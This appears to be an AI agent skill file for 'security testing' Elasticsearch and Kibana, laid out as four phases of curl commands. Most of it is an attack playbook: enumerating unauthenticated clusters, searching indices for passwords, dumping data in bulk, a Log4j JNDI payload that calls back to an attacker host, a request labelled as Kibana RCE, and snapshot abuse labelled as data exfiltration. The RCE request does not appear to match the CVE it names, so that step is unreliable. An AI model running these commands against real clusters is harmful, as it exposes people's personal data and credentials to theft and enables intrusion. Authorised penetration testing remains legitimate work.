---
name: tech-elasticsearch
description: "Elasticsearch and Kibana security testing — unauthenticated data exposure, index enumeration, PII data extraction, Kibana console RCE, snapshot abuse, CVE exploitation. Triggers: 'elasticsearch', 'kibana', 'elastic', 'elasticsearch pentest', 'kibana security', 'elasticsearch unauth', 'elasticsearch data exposure', 'kibana rce'."
---

# Elasticsearch / Kibana Security Testing

Enumerate and exploit exposed Elasticsearch clusters.

---

## Phase 1: Discovery & Cluster Info

```bash
TARGET="http://TARGET:9200"

# Cluster info:
curl -s "$TARGET/" | jq '. | {name, version: .version.number, cluster: .cluster_name}'
curl -s "$TARGET/_cluster/health" | jq '{status, nodes: .number_of_nodes, indices: .active_primary_shards}'

# List indices:
curl -s "$TARGET/_cat/indices?v&h=index,docs.count,store.size" | tee output/es_indices.txt

# Nodes:
curl -s "$TARGET/_cat/nodes?v" | tee output/es_nodes.txt

# With auth:
curl -s -u "elastic:password" "$TARGET/" | jq .version.number
```

---

## Phase 2: Data Enumeration

```bash
TARGET="http://TARGET:9200"

# Get all indices:
curl -s "$TARGET/_cat/indices?format=json" | jq '.[].index' | sort | tee output/es_index_list.txt

# Query index (first 10 docs):
INDEX="users"
curl -s "$TARGET/$INDEX/_search?size=10" | jq '.hits.hits[]._source' | tee output/es_data.txt

# Find PII indices:
for INDEX in $(curl -s "$TARGET/_cat/indices?h=index" | tr -d '"'); do
  HAS_CREDS=$(curl -s "$TARGET/$INDEX/_search?size=1&q=password" | jq '.hits.total.value')
  [ "$HAS_CREDS" -gt 0 ] 2>/dev/null && echo "CREDENTIALS IN: $INDEX"
done | tee output/es_creds_index.txt

# Dump all:
curl -s "$TARGET/$INDEX/_search?size=1000&scroll=1m" | \
  jq '.hits.hits[]._source' | tee output/es_dump_$INDEX.txt
```

---

## Phase 3: Kibana Console RCE

```bash
KIBANA="http://TARGET:5601"

# Check Kibana version:
curl -s "$KIBANA/api/status" | jq '{version: .version.number, state: .status.overall.state}'

# Kibana Console API access (pre-8.x no auth default):
curl -s -X POST "$KIBANA/api/console/proxy?path=_nodes&method=GET" \
  -H "kbn-xsrf: true" | jq '.nodes | to_entries[0] | .value.os'

# CVE-2019-7609 (Kibana RCE via Canvas):
curl -s -X POST "$KIBANA/api/console/proxy?path=%2F.kibana%2F_doc%2F1&method=PUT" \
  -H "kbn-xsrf: true" -H "Content-Type: application/json" \
  -d '{"canvas-workpad": {"dateCreated": 1}}'

# Log4j in Elasticsearch (CVE-2021-44228):
curl -s -H "User-Agent: \${jndi:ldap://ATTACKER:1389/a}" "$TARGET/"
```

---

## Phase 4: Snapshot Abuse

```bash
TARGET="http://TARGET:9200"

# List snapshot repos:
curl -s "$TARGET/_snapshot" | jq . | tee output/es_snapshots.txt

# Create snapshot (exfil data):
curl -s -X PUT "$TARGET/_snapshot/my_backup/snapshot_1?wait_for_completion=true" \
  -H "Content-Type: application/json" \
  -d '{"indices": "users,accounts", "ignore_unavailable": true}' | jq .

# Restore to attacker-controlled path:
curl -s -X PUT "$TARGET/_snapshot/fs_backup" \
  -H "Content-Type: application/json" \
  -d '{"type": "fs", "settings": {"location": "/tmp/es_backup"}}' | jq .
```

---

## Output

Save to `output/`:
- `es_indices.txt` — all index names and sizes
- `es_data.txt` — sample data from sensitive indices
- `es_snapshots.txt` — snapshot repositories

## Next Phase

→ `vuln-sensitive-exposure` for exposed PII documentation
→ `pentest-report` to document Elasticsearch exposure
